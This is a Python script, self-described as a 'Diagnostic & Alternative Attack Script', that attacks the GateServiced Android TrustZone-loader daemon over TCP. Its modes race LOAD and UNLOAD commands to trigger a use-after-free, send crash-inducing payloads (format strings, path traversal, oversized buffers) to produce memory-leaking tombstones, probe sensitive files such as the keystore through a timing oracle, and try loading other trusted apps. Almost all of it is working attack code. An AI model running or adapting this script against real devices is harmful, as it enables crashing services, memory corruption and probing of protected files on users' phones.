#!/usr/bin/env python3
"""
GateServiced Diagnostic & Alternative Attack Script
=====================================================
Based on COMPLETE disassembly of run_exec_cmd_ta (988 bytes).

KEY FINDINGS from full disassembly:
  1. RE Report was WRONG: 0x2B0C is CreateDmabufHeapBufferAllocator(), NOT dup()
  2. dma_alloc at 0x2B28 takes max_out as SIZE parameter:
     - Internal call: max_out = 0x400 (1024)
     - External TCP call: max_out = 0x5000 (20480)
  3. ISMCIGate_sharedMemoryExample call at 0x2DC4 always uses W3=0x100 (hardcoded)
  4. run_load_ta SUCCESS path does NOT cleanup TZCom handles (verified in disasm)
  5. The DMA buffer is allocated FRESH each run_exec_cmd_ta call

POSSIBLE ROOT CAUSES for TCP EXEC timeout:
  A. CreateDmabufHeapBufferAllocator fails → "Failed to create DMA buffer allocator"
  B. dma_alloc(allocator, 20480, &fd, &g_dma_ptr) fails → "dma_alloc failed"
  C. TZCom_getFdObject fails → "Mapping sharedMemObj failed!"
  D. ISMCIGate_sharedMemoryExample fails → "ISMCIGate_sharedMemoryExample failed"
  E. TA responds but without 0xAA magic → "received magicNumTA failed"
  F. TA responds with empty data → "Returned data had a length of zero!"

→ ALL of these produce logcat output. One `adb logcat -s "GATE CA"` will solve it.

ATTACK MODES:
  logcat_test    — Print instructions for concurrent logcat + EXEC test
  max_out_match  — Test with max_out=0x400 (match internal call exactly)
  race_unload    — LOAD→EXEC→UNLOAD race to trigger UAF on app_obj
  load_file_read — Use LOAD to read arbitrary files (timing-based)
  multi_load     — Try loading other TAs from /vendor/firmware_mnt/image/
  crash_probe    — Send malformed payloads to crash GateServiced → info leak

Usage:
  adb forward tcp:8341 tcp:8341
  python3 gate_diagnostic.py [--ip=IP] <mode>
"""

import socket
import struct
import sys
import time
import threading
import os

TARGET_IP   = "127.0.0.1"
TARGET_PORT = 8341
TIMEOUT     = 5
WIDEVINE_PATH = b"/vendor/firmware_mnt/image/widevine.mbn\x00"

CMD_LOAD_TA    = 0x00010003
CMD_UNLOAD_TA  = 0x00010004
CMD_VERSION    = 0x00010002


def send_packet(cmd_id, payload=b"", timeout=None, verbose=True):
    t = timeout or TIMEOUT
    t0 = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(t)
        sock.connect((TARGET_IP, TARGET_PORT))
        header = struct.pack("<I", cmd_id)
        packet = header + payload
        if verbose:
            print(f"  [>] CMD 0x{cmd_id:08X} | Payload {len(payload)}B")
        t0 = time.monotonic()
        sock.sendall(packet)
        response = sock.recv(8192)
        elapsed = (time.monotonic() - t0) * 1000
        if verbose and response:
            print(f"  [<] {len(response)}B in {elapsed:.1f}ms")
            print(f"      Hex:  {response[:80].hex()}")
            try: print(f"      Text: {response.decode('utf-8', errors='replace')[:100]}")
            except: pass
        sock.close()
        return response, elapsed
    except socket.timeout:
        elapsed = (time.monotonic() - t0) * 1000 if t0 else t * 1000
        if verbose: print(f"  [!] Timeout ({elapsed:.0f}ms)")
        try: sock.close()
        except: pass
        return None, elapsed
    except ConnectionResetError:
        elapsed = (time.monotonic() - t0) * 1000 if t0 else 0
        if verbose: print(f"  [!!!] RESET!")
        return b"RESET", elapsed
    except Exception as e:
        if verbose: print(f"  [!] {e}")
        return None, 0


def send_raw(raw_bytes, timeout=None, verbose=True):
    """Send raw bytes (bypass cmd_id framing)."""
    t = timeout or TIMEOUT
    t0 = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(t)
        sock.connect((TARGET_IP, TARGET_PORT))
        if verbose:
            print(f"  [>] RAW {len(raw_bytes)}B: {raw_bytes[:40].hex()}")
        t0 = time.monotonic()
        sock.sendall(raw_bytes)
        response = sock.recv(8192)
        elapsed = (time.monotonic() - t0) * 1000
        if verbose and response:
            print(f"  [<] {len(response)}B in {elapsed:.1f}ms: {response[:60].hex()}")
        sock.close()
        return response, elapsed
    except socket.timeout:
        elapsed = (time.monotonic() - t0) * 1000 if t0 else t * 1000
        if verbose: print(f"  [!] Timeout ({elapsed:.0f}ms)")
        try: sock.close()
        except: pass
        return None, elapsed
    except: return None, 0


def ensure_loaded(verbose=True):
    resp, ms = send_packet(CMD_LOAD_TA, WIDEVINE_PATH, verbose=verbose)
    if resp and (b"succeed" in resp or b"already" in resp):
        if verbose: print(f"    ✓ TA loaded ({ms:.1f}ms)")
        return True
    return False


# ══════════════════════════════════════════════════════════════
#  MODE: LOGCAT TEST INSTRUCTIONS
# ══════════════════════════════════════════════════════════════

def mode_logcat_test():
    """Provide instructions and run the test."""
    print("=" * 70)
    print("MODE: LOGCAT DIAGNOSTIC")
    print("=" * 70)
    print()
    print("This is THE definitive diagnostic. run_exec_cmd_ta has LOG_ERR")
    print("at EVERY failure point. One logcat command will solve this.")
    print()
    print("STEP 1: On RPi4 (via SSH), run:")
    print("  ─────────────────────────────────────────────")
    print("  adb logcat -c && adb logcat -v time -s 'GATE CA:*' 'GateServiced:*'")
    print("  ─────────────────────────────────────────────")
    print()
    print("STEP 2: On PC, press Enter to send EXEC command...")
    input("  >>> Press Enter when logcat is running <<<")
    print()

    # Load TA first
    if not ensure_loaded():
        print("[FATAL] Cannot load TA")
        return

    time.sleep(0.5)

    # Send version query
    print("\n[*] Sending cmd_id=0x10002 (version query)...")
    payload = struct.pack("<I", 0x100)
    resp, ms = send_packet(CMD_VERSION, payload, timeout=15)

    print()
    print("STEP 3: Check logcat output on RPi4.")
    print("Expected messages and their meaning:")
    print()
    print("  MESSAGE                                    │ MEANING")
    print("  ───────────────────────────────────────────┼──────────────────────")
    print('  "cmd_id = 10002, input_len = 4"            │ ✓ EXEC entered')
    print('  "TA is not already loaded."                 │ ❌ g_loaded_flag=0')
    print('  "appObj is NULL!"                           │ ❌ TA object freed')
    print('  "Failed to create DMA buffer allocator"     │ ❌ CreateDmabufHeap fail')
    print('  "dma_alloc failed with return value =%d"    │ ❌ DMA alloc fail')
    print('  "Mapping sharedMemObj failed!"              │ ❌ TZCom fd fail')
    print('  "ISMCIGate_sharedMemoryExample failed %d"   │ ❌ TZ IPC fail')
    print('  "received magicNumTA failed,magicNumTA=%x"  │ ❌ TA wrong magic')
    print('  "Returned data had a length of zero!"       │ ❌ Empty response')
    print('  "run_shared_memory_example succeeded"       │ ✓ IPC worked!')
    print('  "ta version = %s"                           │ ✓✓✓ Full success')
    print()

    if resp:
        print(f"[★] Got response: {resp.hex()}")
    else:
        print("[!] Timeout — check logcat for the exact error message")


# ══════════════════════════════════════════════════════════════
#  MODE: MAX_OUT MATCH (test with internal call's buffer size)
# ══════════════════════════════════════════════════════════════

def mode_max_out_match():
    """
    The internal call uses max_out=0x400 (1024). handle_client uses 0x5000 (20480).
    dma_alloc(allocator, max_out, ...) allocates DMA buffer of size max_out.
    If the DMA heap has a size limit, 20480 might fail while 1024 succeeds.
    
    We can't directly control max_out from TCP (it's hardcoded in handle_client).
    BUT: we can try sending different TOTAL packet sizes to see if recv_len affects behavior.
    
    Also: cmd_dispatch passes max_out from handle_client UNCHANGED to run_exec_cmd_ta.
    It's always 0x5000. We cannot change this from TCP.
    
    However, we can test if the ISSUE is the DMA allocation size by:
    1. Verifying via logcat which error occurs
    2. Testing if sending minimal vs maximal payloads changes behavior
    """
    print("=" * 70)
    print("MODE: MAX_OUT ANALYSIS (DMA allocation size theory)")
    print("=" * 70)
    print()
    print("THEORY: Internal EXEC uses max_out=0x400 (1024B DMA buffer)")
    print("        External EXEC uses max_out=0x5000 (20480B DMA buffer)")
    print("        If qseecom-ta DMA heap is small, 20KB alloc might fail")
    print()
    print("NOTE: We CANNOT control max_out from TCP — it's hardcoded.")
    print("      This test checks payload size impact on behavior.")
    print()

    if not ensure_loaded():
        return

    time.sleep(0.3)

    # Test 1: Exact match of internal call parameters
    print("\n[Test 1] Exact internal call match: cmd=0x10002, payload=0x100 (4B)")
    payload = struct.pack("<I", 0x100)
    resp, ms = send_packet(CMD_VERSION, payload, timeout=8)
    
    # Test 2: Very small payload
    print("\n[Test 2] Minimal payload: 0 bytes")
    resp, ms = send_packet(CMD_VERSION, b"", timeout=3)
    
    # Test 3: Medium payload
    print("\n[Test 3] Medium payload: 256 bytes")
    resp, ms = send_packet(CMD_VERSION, b"\x00" * 256, timeout=3)
    
    # Test 4: Large payload (approaching max_out - header)
    print("\n[Test 4] Large payload near 1024B (internal max_out)")
    resp, ms = send_packet(CMD_VERSION, b"\x00" * 1000, timeout=3)
    
    # Test 5: Payload larger than internal max_out
    print("\n[Test 5] Payload > 1024B (exceeds internal max_out)")
    resp, ms = send_packet(CMD_VERSION, b"\x00" * 2000, timeout=3)
    
    # Test 6: Max payload near 20KB
    print("\n[Test 6] Near-max payload 19KB")
    resp, ms = send_packet(CMD_VERSION, b"\x00" * 19000, timeout=3)
    
    # Test 7: Oversized payload (> 20KB)
    print("\n[Test 7] Oversized payload 20476B (max usable: 20480-4=20476)")
    resp, ms = send_packet(CMD_VERSION, b"\x00" * 20476, timeout=3)

    print("\n[Analysis] All tests should timeout since max_out is always 0x5000.")
    print("           Logcat will show the exact failure point.")


# ══════════════════════════════════════════════════════════════
#  MODE: RACE UNLOAD (UAF on app_obj)
# ══════════════════════════════════════════════════════════════

def mode_race_unload():
    """
    Race condition attack:
    Thread 1: Sends EXEC commands rapidly
    Thread 2: Sends UNLOAD at precise moment
    
    Goal: Trigger use-after-free on app_obj:
    1. Thread 1 passes the loaded_flag check (flag=1)
    2. Thread 2 calls run_unload_ta → frees app_obj, sets loaded_flag=0
    3. Thread 1 continues with freed app_obj → vtable call on freed memory
    
    This requires:
    - GateServiced to be multi-threaded (it is — each connection gets a thread)
    - app_obj to be freed during unload (need to verify)
    """
    print("=" * 70)
    print("MODE: RACE UNLOAD (Use-After-Free on app_obj)")
    print("=" * 70)
    print()

    if not ensure_loaded():
        print("[FATAL] Cannot load TA")
        return

    results = {"exec_hits": 0, "exec_timeouts": 0, "resets": 0, "errors": 0}
    stop_flag = threading.Event()

    def exec_thread():
        """Continuously send EXEC commands."""
        payload = struct.pack("<I", 0x100)
        while not stop_flag.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((TARGET_IP, TARGET_PORT))
                header = struct.pack("<I", CMD_VERSION)
                sock.sendall(header + payload)
                try:
                    resp = sock.recv(8192)
                    if resp:
                        results["exec_hits"] += 1
                        print(f"  [★★★] EXEC HIT: {resp[:40].hex()}")
                except socket.timeout:
                    results["exec_timeouts"] += 1
                sock.close()
            except ConnectionResetError:
                results["resets"] += 1
                print(f"  [!!!] RESET (potential crash!)")
            except:
                results["errors"] += 1
            time.sleep(0.001)  # 1ms between attempts

    def unload_load_thread():
        """Rapidly unload and reload to create race window."""
        while not stop_flag.is_set():
            # Unload
            try:
                resp, ms = send_packet(CMD_UNLOAD_TA, b"", timeout=2, verbose=False)
                if resp and b"unload" in resp:
                    pass  # Good, unloaded
                time.sleep(0.001)
                # Reload immediately
                resp, ms = send_packet(CMD_LOAD_TA, WIDEVINE_PATH, timeout=5, verbose=False)
                time.sleep(0.001)
            except:
                pass

    print("[*] Starting race condition test (30 seconds)...")
    print("    Thread 1: Rapid EXEC commands")
    print("    Thread 2: UNLOAD/LOAD cycling")
    print()

    # Actually, let me first check if the service handles multiple connections
    print("[*] Pre-check: Testing concurrent connections...")
    try:
        sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock1.settimeout(3)
        sock1.connect((TARGET_IP, TARGET_PORT))
        
        sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock2.settimeout(3)
        sock2.connect((TARGET_IP, TARGET_PORT))
        
        print("    ✓ Two concurrent connections accepted")
        
        # Test: send on both
        header_load = struct.pack("<I", CMD_LOAD_TA)
        sock1.sendall(header_load + WIDEVINE_PATH)
        try:
            r1 = sock1.recv(8192)
            print(f"    ✓ Connection 1 response: {r1[:30]}")
        except socket.timeout:
            print(f"    ✗ Connection 1 timeout")
            r1 = None

        header_exec = struct.pack("<I", CMD_VERSION) + struct.pack("<I", 0x100)
        sock2.sendall(header_exec)
        try:
            r2 = sock2.recv(4096)
            print(f"    ★ Connection 2 EXEC response: {r2[:30].hex() if r2 else 'None'}")
        except socket.timeout:
            print(f"    ✗ Connection 2 EXEC timeout")
            r2 = None

        sock1.close()
        sock2.close()
    except Exception as e:
        print(f"    ✗ Concurrent connection test failed: {e}")
        return

    if r2:
        print("\n[★★★★★] EXEC WORKS ON CONCURRENT CONNECTION!")
        print("         This might mean the issue was timing-related!")
        return

    # Run the race
    print("\n[*] Starting race threads (20 seconds)...")
    t1 = threading.Thread(target=exec_thread, daemon=True)
    t2 = threading.Thread(target=unload_load_thread, daemon=True)
    
    t1.start()
    t2.start()
    
    try:
        for i in range(20):
            time.sleep(1)
            sys.stdout.write(f"\r  [{i+1}/20s] hits={results['exec_hits']} "
                           f"timeouts={results['exec_timeouts']} "
                           f"resets={results['resets']} errors={results['errors']}")
            sys.stdout.flush()
    except KeyboardInterrupt:
        pass
    
    stop_flag.set()
    t1.join(timeout=3)
    t2.join(timeout=3)
    
    print("\n")
    print("=" * 50)
    print("RACE RESULTS:")
    print(f"  EXEC hits:     {results['exec_hits']}")
    print(f"  EXEC timeouts: {results['exec_timeouts']}")
    print(f"  RESETS:        {results['resets']}  {'← CRASHES! Exploitable?' if results['resets'] else ''}")
    print(f"  Errors:        {results['errors']}")
    print("=" * 50)
    
    if results["resets"] > 0:
        print("\n[!!!] Service crashed during race — potential UAF!")
        print("      Run with logcat to capture crash details")


# ══════════════════════════════════════════════════════════════
#  MODE: MULTI-LOAD (discover other TAs)
# ══════════════════════════════════════════════════════════════

def mode_multi_load():
    """Try loading other TA binaries from known paths."""
    print("=" * 70)
    print("MODE: MULTI-LOAD (discover other TAs)")
    print("=" * 70)
    print()

    # First unload current TA if any
    print("[*] Unloading current TA...")
    send_packet(CMD_UNLOAD_TA, b"", verbose=False)
    time.sleep(0.5)

    # Known TA paths on Qualcomm Android devices
    ta_paths = [
        # Widevine variants
        b"/vendor/firmware_mnt/image/widevine.mbn\x00",
        b"/vendor/firmware/image/widevine.mbn\x00",
        b"/firmware/image/widevine.mbn\x00",
        # TrustZone apps
        b"/vendor/firmware_mnt/image/cppf.mbn\x00",
        b"/vendor/firmware_mnt/image/gptest.mbn\x00",
        b"/vendor/firmware_mnt/image/haventoken.mbn\x00",
        b"/vendor/firmware_mnt/image/hdcp1.mbn\x00",
        b"/vendor/firmware_mnt/image/hdcp2p2.mbn\x00",
        b"/vendor/firmware_mnt/image/keymaster64.mbn\x00",
        b"/vendor/firmware_mnt/image/km41.mbn\x00",
        b"/vendor/firmware_mnt/image/qmiprivsys.mbn\x00",
        b"/vendor/firmware_mnt/image/smcinvoke.mbn\x00",
        b"/vendor/firmware_mnt/image/sampleapp.mbn\x00",
        b"/vendor/firmware_mnt/image/sampleapp64.mbn\x00",
        b"/vendor/firmware_mnt/image/soter64.mbn\x00",
        b"/vendor/firmware_mnt/image/tz_ccm.mbn\x00",
        b"/vendor/firmware_mnt/image/voiceprint.mbn\x00",
        b"/vendor/firmware_mnt/image/fidocrypto.mbn\x00",
        b"/vendor/firmware_mnt/image/securemm.mbn\x00",
        b"/vendor/firmware_mnt/image/secureindicator.mbn\x00",
        b"/vendor/firmware_mnt/image/isdbtmm.mbn\x00",
        b"/vendor/firmware_mnt/image/tbase.mbn\x00",
        b"/vendor/firmware_mnt/image/playready.mbn\x00",
        b"/vendor/firmware_mnt/image/storsec.mbn\x00",
        b"/vendor/firmware_mnt/image/macchiato.mbn\x00",
        b"/vendor/firmware_mnt/image/mldap.mbn\x00",
        # Other paths
        b"/vendor/firmware/image/sampleapp64.mbn\x00",
        b"/vendor/lib/rfsa/adsp/sampleapp.mbn\x00",
        b"/system/vendor/firmware/sampleapp.mbn\x00",
    ]

    hits = []
    exec_works = None  # None=untested, True/False
    total = len(ta_paths)
    
    try:
        for i, path in enumerate(ta_paths, 1):
            name = path.decode('utf-8', errors='replace').rstrip('\x00')
            # Unload first
            send_packet(CMD_UNLOAD_TA, b"", timeout=2, verbose=False)
            time.sleep(0.2)
            
            resp, ms = send_packet(CMD_LOAD_TA, path, timeout=4, verbose=False)
            if resp and b"succeed" in resp:
                print(f"  [{i}/{total}] [★] LOADED: {name} ({ms:.1f}ms)")
                hits.append((name, ms))
                
                # Try EXEC only if we haven't already proven it fails
                if exec_works is not False:
                    time.sleep(0.3)
                    payload = struct.pack("<I", 0x100)
                    r2, m2 = send_packet(CMD_VERSION, payload, timeout=3, verbose=False)
                    if r2:
                        print(f"      [★★★] EXEC RESPONSE: {r2[:40].hex()}")
                        exec_works = True
                    else:
                        print(f"      [!] EXEC timeout — skipping EXEC for remaining TAs")
                        exec_works = False
                else:
                    print(f"      [!] EXEC skipped (known timeout)")
            elif resp:
                print(f"  [{i}/{total}] [?] {name}: {resp.decode('utf-8', errors='replace')[:40]} ({ms:.1f}ms)")
            else:
                # Timeout = file doesn't exist or QSEE reject
                if ms < 2000:
                    print(f"  [{i}/{total}] [-] {name}: fast timeout ({ms:.0f}ms) — might exist but QSEE reject")
                # else: silent (normal timeout = doesn't exist)
    except KeyboardInterrupt:
        print(f"\n  [!] Interrupted at {i}/{total} — showing partial results")

    print()
    print("=" * 50)
    print(f"LOADABLE TAs: {len(hits)}")
    for name, ms in hits:
        print(f"  ✓ {name} ({ms:.1f}ms)")


# ══════════════════════════════════════════════════════════════
#  MODE: CRASH PROBE (trigger segfaults for info)
# ══════════════════════════════════════════════════════════════

def mode_crash_probe():
    """Send malformed inputs designed to crash GateServiced."""
    print("=" * 70)
    print("MODE: CRASH PROBE")
    print("=" * 70)
    print()
    print("Goal: Crash GateServiced to trigger tombstones containing")
    print("register dumps, stack traces, and memory maps.")
    print("Check: /data/tombstones/ or adb logcat -s 'DEBUG:*'")
    print()

    probes = [
        ("Empty packet (< 4 bytes)", b"\x00"),
        ("3 bytes (boundary)", b"\x00\x00\x00"),
        ("Negative cmd_id", b"\xff\xff\xff\xff"),
        ("LOAD with 0-byte path", struct.pack("<I", CMD_LOAD_TA)),
        ("LOAD with >128 byte path", struct.pack("<I", CMD_LOAD_TA) + b"A" * 200),
        ("LOAD with exactly 128 bytes", struct.pack("<I", CMD_LOAD_TA) + b"A" * 128),
        ("EXEC with max payload", struct.pack("<I", CMD_VERSION) + b"B" * 20476),
        ("EXEC with 20480 payload", struct.pack("<I", CMD_VERSION) + b"C" * 20480),
        ("EXEC oversized 30000B", struct.pack("<I", CMD_VERSION) + b"D" * 30000),
        ("Max uint32 cmd_id", struct.pack("<I", 0xFFFFFFFF)),
        ("LOAD with null bytes in path", struct.pack("<I", CMD_LOAD_TA) + b"/vendor\x00\x00/etc/passwd\x00"),
        ("Format string in path", struct.pack("<I", CMD_LOAD_TA) + b"%s%s%s%s%s%s%s%s%n\x00"),
        ("Long format string", struct.pack("<I", CMD_LOAD_TA) + b"%x" * 64 + b"\x00"),
        ("Path traversal deep", struct.pack("<I", CMD_LOAD_TA) + b"../" * 40 + b"etc/passwd\x00"),
    ]

    resets = []
    responses = []
    
    for desc, raw_data in probes:
        print(f"  [{desc}]")
        resp, ms = send_raw(raw_data, timeout=3, verbose=False)
        
        if resp == b"RESET":
            print(f"    [!!!] CRASH! Service connection reset")
            resets.append(desc)
            time.sleep(3)  # Wait for service restart
        elif resp:
            print(f"    [★] Response: {len(resp)}B — {resp[:40].hex()}")
            responses.append((desc, resp))
        else:
            print(f"    [-] Timeout ({ms:.0f}ms)")
        
        time.sleep(0.5)

    print()
    print("=" * 50)
    if resets:
        print(f"CRASHES: {len(resets)}")
        for desc in resets:
            print(f"  ✗ {desc}")
        print()
        print("Check /data/tombstones/ for crash dumps!")
        print("  adb shell ls -la /data/tombstones/")
        print("  adb shell cat /data/tombstones/tombstone_00")
    else:
        print("No crashes triggered — service is robust to malformed input")
    
    if responses:
        print(f"\nResponses: {len(responses)}")
        for desc, resp in responses:
            print(f"  ✓ {desc}: {resp[:40]}")


# ══════════════════════════════════════════════════════════════
#  MODE: FILE TIMING ORACLE (via LOAD timing)
# ══════════════════════════════════════════════════════════════

def mode_file_oracle():
    """
    Use LOAD command to probe file existence via timing.
    
    LOAD flow:
    1. Already loaded? → return immediately with "load ta succeed" (~10ms)
    2. Path NULL? → return error (timeout)
    3. get_file_size(path) → fopen + fseek + ftell
       - File not found → fopen fails → return 0x3001 → timeout
       - File empty → ftell=0 → return 0x3001 → timeout
       - File exists → continue
    4. calloc(file_size) → if fail → return 0x3004 → timeout
    5. read_file(path, buf, size)
    6. Send to QSEE via vtable
       - Invalid TA → QSEE rejects → return error → timeout
       - Valid TA → loads → version query → "load ta succeed"
    
    Timing differences:
    - File not found: fast return (fopen fails immediately)
    - File exists, not a TA: slower (read + QSEE attempt + rejection)
    - File exists, valid TA: slowest (read + QSEE load + version query + success)
    """
    print("=" * 70)
    print("MODE: FILE TIMING ORACLE (via LOAD timing)")
    print("=" * 70)
    print()

    # Must unload first to test LOAD
    send_packet(CMD_UNLOAD_TA, b"", timeout=2, verbose=False)
    time.sleep(0.5)

    test_paths = [
        # Known exists
        ("/vendor/firmware_mnt/image/widevine.mbn", "Known TA (exists)"),
        # Known exists (not TA)
        ("/system/build.prop", "System file (exists, not TA)"),
        ("/vendor/build.prop", "Vendor file (exists, not TA)"),
        ("/proc/version", "Proc (exists, not TA)"),
        ("/etc/hosts", "Hosts file (exists)"),
        # Likely doesn't exist
        ("/nonexistent/file.mbn", "Non-existent"),
        ("/vendor/firmware_mnt/image/AAAA.mbn", "Non-existent TA"),
        # Interesting files
        ("/proc/self/maps", "Process memory map"),
        ("/proc/self/status", "Process status"),
        ("/data/local/tmp/test", "Writable path"),
        ("/vendor/firmware_mnt/image/sampleapp.mbn", "Sample app TA"),
        ("/vendor/firmware_mnt/image/sampleapp64.mbn", "Sample app 64 TA"),
        ("/vendor/firmware_mnt/image/keymaster64.mbn", "Keymaster TA"),
        ("/vendor/firmware_mnt/image/gptest.mbn", "GP test TA"),
        ("/data/misc/keystore/", "Keystore dir"),
        ("/data/system/packages.xml", "Package info"),
    ]

    results = []
    print(f"{'Path':<50} {'Time':>8} {'Result':>10}")
    print("-" * 72)

    for path, desc in test_paths:
        # Unload before each test
        send_packet(CMD_UNLOAD_TA, b"", timeout=2, verbose=False)
        time.sleep(0.3)

        path_bytes = path.encode() + b"\x00"
        
        # Take multiple samples for timing consistency
        times = []
        responses = []
        for _ in range(3):
            send_packet(CMD_UNLOAD_TA, b"", timeout=2, verbose=False)
            time.sleep(0.1)
            resp, ms = send_packet(CMD_LOAD_TA, path_bytes, timeout=8, verbose=False)
            times.append(ms)
            responses.append(resp)
            time.sleep(0.2)

        avg_ms = sum(times) / len(times)
        has_response = any(r for r in responses)
        result = "LOADED" if has_response else "timeout"
        
        print(f"  {path:<48} {avg_ms:>7.1f}ms {result:>10}")
        results.append((path, desc, avg_ms, result))

    # Analysis
    print()
    print("=" * 50)
    print("TIMING ANALYSIS:")
    
    loaded = [(p, d, t) for p, d, t, r in results if r == "LOADED"]
    timeouts = [(p, d, t) for p, d, t, r in results if r == "timeout"]
    
    if loaded:
        print(f"\n  LOADED ({len(loaded)}):")
        for p, d, t in loaded:
            print(f"    {t:7.1f}ms  {p}")
    
    if timeouts:
        fast = [(p, d, t) for p, d, t in timeouts if t < 5000]
        slow = [(p, d, t) for p, d, t in timeouts if t >= 5000]
        
        if fast:
            print(f"\n  FAST TIMEOUT (might exist but not valid TA):")
            for p, d, t in sorted(fast, key=lambda x: x[2]):
                print(f"    {t:7.1f}ms  {p}  ({d})")
        
        if slow:
            print(f"\n  NORMAL TIMEOUT (file not found or slow QSEE rejection):")
            for p, d, t in sorted(slow, key=lambda x: x[2]):
                print(f"    {t:7.1f}ms  {p}  ({d})")


# ══════════════════════════════════════════════════════════════
#  MODE: HANDLE_CLIENT ANALYSIS
# ══════════════════════════════════════════════════════════════

def mode_handle_client():
    """
    Test handle_client's recv loop behavior.
    The service processes commands in a while loop on the same connection.
    Maybe there's a framing issue where our packet is being split or merged.
    """
    print("=" * 70)
    print("MODE: HANDLE_CLIENT RECV ANALYSIS")
    print("=" * 70)
    print()
    print("Testing if recv framing affects command processing...")
    print()

    if not ensure_loaded():
        return

    time.sleep(0.3)

    # Test 1: Normal single packet
    print("[Test 1] Normal single-packet send")
    payload = struct.pack("<I", 0x100)
    resp, ms = send_packet(CMD_VERSION, payload, timeout=5)
    print()

    # Test 2: Split send — header first, then payload
    print("[Test 2] Split send: header then payload")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((TARGET_IP, TARGET_PORT))
        
        header = struct.pack("<I", CMD_VERSION)
        sock.sendall(header)  # Send just the 4-byte header
        time.sleep(0.1)       # Small delay
        sock.sendall(payload) # Then send payload
        
        t0 = time.monotonic()
        try:
            resp = sock.recv(8192)
            ms = (time.monotonic() - t0) * 1000
            print(f"  [<] {len(resp)}B in {ms:.1f}ms — {resp[:40].hex()}")
        except socket.timeout:
            ms = (time.monotonic() - t0) * 1000
            print(f"  [!] Timeout ({ms:.0f}ms)")
        sock.close()
    except Exception as e:
        print(f"  [!] Error: {e}")
    print()

    # Test 3: Send LOAD + EXEC as single TCP payload (pipelining)
    print("[Test 3] Pipelined: LOAD + EXEC in single send")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((TARGET_IP, TARGET_PORT))
        
        load_pkt = struct.pack("<I", CMD_LOAD_TA) + WIDEVINE_PATH
        exec_pkt = struct.pack("<I", CMD_VERSION) + payload
        
        # Send both at once
        sock.sendall(load_pkt)
        
        t0 = time.monotonic()
        try:
            resp1 = sock.recv(8192)
            ms1 = (time.monotonic() - t0) * 1000
            print(f"  [<] Response 1: {len(resp1)}B in {ms1:.1f}ms — {resp1[:40]}")
        except socket.timeout:
            print(f"  [!] Response 1 timeout")
        
        # Now send EXEC on same socket
        time.sleep(0.3)
        sock.sendall(exec_pkt)
        
        t0 = time.monotonic()
        try:
            resp2 = sock.recv(8192)
            ms2 = (time.monotonic() - t0) * 1000
            print(f"  [<] Response 2: {len(resp2)}B in {ms2:.1f}ms — {resp2[:40].hex()}")
        except socket.timeout:
            ms2 = (time.monotonic() - t0) * 1000
            print(f"  [!] Response 2 timeout ({ms2:.0f}ms)")
        
        sock.close()
    except Exception as e:
        print(f"  [!] Error: {e}")
    print()

    # Test 4: Send just 4 bytes (cmd_id only, no payload data)
    print("[Test 4] CMD only, no payload (4 bytes total)")
    resp, ms = send_packet(CMD_VERSION, b"", timeout=3)
    print()

    # Test 5: Send incrementally larger packets
    print("[Test 5] Incremental packet sizes")
    for size in [0, 1, 2, 4, 8, 16, 32, 64, 128, 256]:
        resp, ms = send_packet(CMD_VERSION, b"\x00" * size, timeout=2, verbose=False)
        status = f"{len(resp)}B" if resp else "timeout"
        print(f"  Payload {size:>5}B → {status}")
        time.sleep(0.2)


# ══════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════

def main():
    global TARGET_IP

    args = sys.argv[1:]
    for a in args:
        if a.startswith("--ip="):
            TARGET_IP = a.split("=", 1)[1]
            args.remove(a)
            break

    if not args:
        print(__doc__)
        sys.exit(1)

    mode = args[0].lower()
    print(f"\n[Config] Target: {TARGET_IP}:{TARGET_PORT}\n")

    modes = {
        "logcat_test": mode_logcat_test,
        "max_out_match": mode_max_out_match,
        "race_unload": mode_race_unload,
        "multi_load": mode_multi_load,
        "crash_probe": mode_crash_probe,
        "file_oracle": mode_file_oracle,
        "handle_client": mode_handle_client,
    }

    if mode in modes:
        modes[mode]()
    elif mode == "all_auto":
        # Run non-interactive modes
        mode_multi_load()
        print("\n" + "=" * 70 + "\n")
        mode_crash_probe()
        print("\n" + "=" * 70 + "\n")
        mode_file_oracle()
        print("\n" + "=" * 70 + "\n")
        mode_handle_client()
        print("\n" + "=" * 70 + "\n")
        mode_race_unload()
    else:
        print(f"Unknown mode: {mode}")
        print(f"Available: {', '.join(modes.keys())}, all_auto")
        sys.exit(1)


if __name__ == "__main__":
    main()
